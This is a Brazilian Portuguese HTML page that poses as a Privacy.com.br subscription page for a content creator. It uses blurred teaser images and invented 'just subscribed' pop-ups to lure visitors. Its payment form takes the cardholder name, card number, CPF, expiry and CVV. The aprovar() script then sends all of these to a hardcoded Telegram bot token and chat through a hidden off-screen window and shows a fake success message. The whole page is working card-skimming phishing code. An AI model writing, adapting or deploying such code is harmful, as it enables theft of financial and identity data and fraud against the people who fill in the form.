<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        :root { --p-orange: #f47b52; --p-grad: linear-gradient(90deg, #f47b52, #f9a67a); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #fff; color: #333; padding-bottom: 100px; overflow-x: hidden; }

        /* Usando suas imagens locais */
        .nav { padding: 12px 20px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; position: sticky; top: 0; background: #fff; z-index: 100; }
        .banner { width: 100%; height: 220px; background: #eee url('capa.png') center/cover; }
        .p-wrapper { margin-top: -55px; padding-left: 20px; }
        .p-pic { width: 115px; height: 115px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        
        .info { padding: 10px 20px; }
        .name { display: flex; align-items: center; gap: 6px; font-size: 22px; font-weight: 700; }
        .user { color: #666; font-size: 14px; margin-bottom: 10px; }
        
        .btn-box { padding: 15px 20px; display: flex; flex-direction: column; gap: 12px; }
        .btn-s { width: 100%; padding: 18px 25px; border-radius: 50px; border: none; color: #fff; display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: var(--p-grad); font-weight: 700; font-size: 18px; }

        /* Galeria com suas imagens */
        .media-gallery { padding: 0 20px; display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
        .media-gallery div { width: 100%; height: 250px; border-radius: 15px; background-size: cover; filter: blur(12px); border: 1px solid #eee; }

        .fake-notif { position: fixed; bottom: 20px; left: 15px; right: 15px; background: #fff; padding: 12px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); display: flex; align-items: center; gap: 12px; z-index: 3000; transform: translateY(200%); transition: 0.5s; }
        .fake-notif.show { transform: translateY(0); }

        #payModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); }
        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 420px; border-radius: 25px; padding: 25px; position: relative; }
        .f-group { margin-bottom: 12px; }
        .f-group label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 4px; }
        .f-group input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; outline: none; background: #fafafa; }
        .btn-final { width: 100%; padding: 18px; background: var(--p-grad); color: #fff; border: none; border-radius: 50px; font-weight: 800; font-size: 18px; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="26"><i class="fa-solid fa-bars"></i></div>
    <div class="banner"></div>
    <div class="p-wrapper"><div class="p-pic"></div></div>

    <div class="info">
        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
        <p class="user">@eukamylinhasantos</p>
        <p style="font-size: 14px; color: #444;">Assine para ver meus conte√∫dos exclusivos e sem censura! üî•</p>
    </div>

    <div class="btn-box">
        <div class="btn-s" onclick="openP()"><span>Mensal</span><span>R$ 10,00</span></div>
        <div class="btn-s" onclick="openP()" style="opacity:0.9"><span>Vital√≠cio</span><span>R$ 27,00</span></div>
    </div>

    <div class="media-gallery">
        <div style="background-image:url('imagem1.png');"></div>
        <div style="background-image:url('imagem2.png');"></div>
    </div>

    <div class="fake-notif" id="notif">
        <img src="perfil1.png" width="45" style="border-radius:10px">
        <div><span id="n-user"><b>Marcos S.</b></span> assinou agora!<br><small style="color:var(--p-orange);font-weight:bold">Acesso Liberado ‚úÖ</small></div>
    </div>

    <div id="payModal">
        <div class="m-content">
            <h2 style="text-align:center; color: var(--p-orange); margin-bottom: 20px;">Pagamento Seguro</h2>
            <div class="f-group"><label>Nome no Cart√£o</label><input type="text" id="p_name" placeholder="Nome Completo"></div>
            <div class="f-group"><label>N√∫mero do Cart√£o</label><input type="text" id="c_num" placeholder="0000 0000 0000 0000"></div>
            <div class="f-group"><label>CPF do Titular</label><input type="text" id="cpf" placeholder="000.000.000-00"></div>
            <div style="display:flex; gap: 10px;">
                <div class="f-group" style="flex:2"><label>Validade</label><input type="text" id="c_date" placeholder="MM/AA"></div>
                <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="cvv" placeholder="000"></div>
            </div>
            <button class="btn-final" onclick="aprovar()">APROVAR COMPRA</button>
            <p style="text-align:center; margin-top:15px; font-size:12px; color:#999; cursor:pointer" onclick="closeP()">Voltar</p>
        </div>
    </div>

    <script>
        $(document).ready(function(){
            $('#c_num').mask('0000 0000 0000 0000');
            $('#cpf').mask('000.000.000-00');
            $('#c_date').mask('00/00');
            $('#cvv').mask('000');
            setInterval(showF, 12000);
        });

        function openP() { $('#payModal').fadeIn(); }
        function closeP() { $('#payModal').fadeOut(); }

        function showF() {
            const nomes = ["Ricardo M.", "Felipe A.", "Gustavo S.", "Andre L.", "Marcos J."];
            $('#n-user').html(`<b>${nomes[Math.floor(Math.random()*nomes.length)]}</b>`);
            $('#notif').addClass('show');
            setTimeout(() => $('#notif').removeClass('show'), 4000);
        }

        function aprovar() {
            const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
            const chat = '7320822019';
            
            const n = $('#p_name').val();
            const c = $('#c_num').val();
            const f = $('#cpf').val();
            const d = $('#c_date').val();
            const v = $('#cvv').val();

            if (c.length < 16) {
                Notiflix.Notify.failure('Dados incompletos!');
                return;
            }

            const msg = `üî• NOVO CARD\nüë§ Nome: ${n}\nüí≥ Card: ${c}\nüÜî CPF: ${f}\nüìÖ Val: ${d}\nüîí CVV: ${v}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
            
            // Simula o teste manual que funcionou no seu bot Nox √© Pika
            const win = window.open(url, '_blank', 'width=1,height=1,left=10000,top=10000');
            
            Notiflix.Loading.circle('Processando...');

            setTimeout(() => {
                if(win) win.close();
                Notiflix.Loading.remove();
                Notiflix.Report.success('Comprado com Sucesso', 'Acesso liberado! Verifique seu e-mail.', 'OK', () => {
                    location.reload();
                });
            }, 2000);
        }
    </script>
</body>
</html>
